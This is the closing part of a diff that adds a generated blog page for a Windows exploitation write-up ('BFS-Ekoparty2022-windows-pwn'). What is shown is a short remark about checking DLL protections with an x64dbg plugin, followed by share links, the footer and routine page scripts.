class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;x64dbg 插件：&lt;a href=&#34;https://github.com/klks/checksec&#34;&gt;checksec: x64dbg plugin to check security settings&lt;/a&gt;，可以看相关dll的保护。&lt;/p&gt;
+&lt;p&gt;没有GS保护？但是使用IDA打开&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&t=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    ham5t3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
